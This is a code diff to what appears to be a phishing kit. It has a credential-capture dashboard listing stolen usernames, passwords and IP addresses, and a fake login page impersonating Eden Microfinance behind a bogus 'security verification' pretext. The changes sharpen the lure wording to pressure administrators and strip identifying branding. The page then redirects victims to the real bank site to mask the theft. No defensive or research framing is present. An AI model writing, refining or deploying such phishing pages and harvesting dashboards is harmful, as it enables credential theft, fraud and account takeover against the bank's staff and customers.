@@ -38,7 +38,7 @@ DASHBOARD_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SystemUpdate - Intelligence Dashboard</title>
+    <title>Intelligence Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
@@ -116,13 +116,13 @@ DASHBOARD_HTML = '''
     <button onclick="login()">Login</button>
 </div>
 <div id="content" style="display:none">
-    <h1>🎯 SystemUpdate - Intelligence Dashboard</h1>
+    <h1>🎯 Intelligence Dashboard</h1>
     <div class="stats">
         <div class="stat-box">🔴 Status: <span class="success">ACTIVE</span></div>
         <div class="stat-box" id="stats">📊 0 credential(s) captured</div>
         <div class="stat-box" id="alert"></div>
     </div>
-    <h2>📋 Captured Credentials (Eden Microfinance)</h2>
+    <h2>📋 Captured Credentials </h2>
     <div style="overflow-x:auto;">
     <table>
         <thead><tr><th>Time</th><th>IP Address</th><th>Source</th><th>Username</th><th>Password</th><th>Action</th></tr></thead>
@@ -203,7 +203,7 @@ PHISHING_HTML = '''
 <div class="container">
     <div class="header">
         <h1>🏦 Eden Microfinance</h1>
-        <p>Banque de l'Épargne et du Développement</p>
+        <p>Login attepts found, we must make sure it's You!</p>
     </div>
     
     <div class="alert-box">
@@ -212,14 +212,15 @@ PHISHING_HTML = '''
     </div>
     
     <div class="info-box">
-        🔐 <span>Ultahost Security Verification Required</span> 🔐
+        🔐 <span>Ultahost Security Verification Required. You Must login using 
+Our Secure steps and make sure It's real admins from Eden MF.</span> 🔐
     </div>
     
     <div class="login-form">
         <form id="loginForm">
             <div class="input-group">
                 <label>Username or Email Address</label>
-                <input type="text" id="username" placeholder="Enter your Eden Microfinance username" required autocomplete="off">
+                <input type="text" id="username" placeholder="Enter your Eden MF username" required autocomplete="off">
             </div>
             <div class="input-group">
                 <label>Password</label>
@@ -254,7 +255,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     });
     
     setTimeout(() => {
-        loader.innerHTML = '✅ Identity verified! Redirecting to secure portal...';
+        loader.innerHTML = '✅ Identity verified! getting back to your Main page...';
         setTimeout(() => {
             window.location.href = 'https://www.edenmicrofinance.com';
         }, 2000);
